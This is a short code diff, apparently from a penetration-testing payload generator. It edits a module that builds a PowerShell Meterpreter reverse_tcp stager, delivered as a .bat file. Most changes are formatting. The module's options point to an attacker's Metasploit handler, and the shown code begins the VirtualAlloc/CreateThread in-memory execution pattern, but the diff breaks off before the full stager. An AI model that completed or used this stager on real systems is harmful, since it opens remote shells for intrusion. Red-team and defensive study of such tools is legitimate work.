@@ -10,21 +10,22 @@ from modules.common import helpers
 
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
         self.rating = "Excellent"
         self.language = "powershell"
         self.extension = "bat"
-        
-        # optional
-        self.required_options = {   "LHOST" : ["", "IP of the metasploit handler"],
-                                    "LPORT" : ["4444", "Port of the metasploit handler"]}
 
-    
+        # optional
+        self.required_options = {   "LHOST" : ["", "IP of the Metasploit handler"],
+                                    "LPORT" : ["4444", "Port of the Metasploit handler"]
+                                }
+
+
     def generate(self):
-        
+
         baseString = """$c = @"
 [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
 [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
